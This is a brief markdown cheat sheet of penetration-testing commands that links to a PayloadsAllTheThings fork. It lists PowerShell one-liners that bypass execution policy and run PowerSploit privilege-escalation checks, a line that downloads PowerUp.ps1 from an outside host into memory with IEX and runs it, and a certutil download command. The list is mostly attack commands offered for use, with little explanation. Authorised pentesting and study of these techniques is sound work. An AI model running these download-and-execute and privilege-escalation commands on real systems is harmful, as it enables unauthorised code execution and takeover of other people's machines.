# Helpful pentest commands

## [PayloadsAllTheThings - Methodology and Resources](https://github.com/cerberusec/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)

## Powersploit

* powershell -exec bypass -c "Import-Module .\Privesc; Invoke-AllChecks"

#### Download In-Memory:

* powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://.../PowerUp.ps1'); Invoke-AllChecks"

## Simple Download:

* certutil -urlcache -split -f "http://..."

* IEX (New-Object Net.WebClient).DownloadString('http://.../PowerUp.ps1'); Invoke-AllChecks
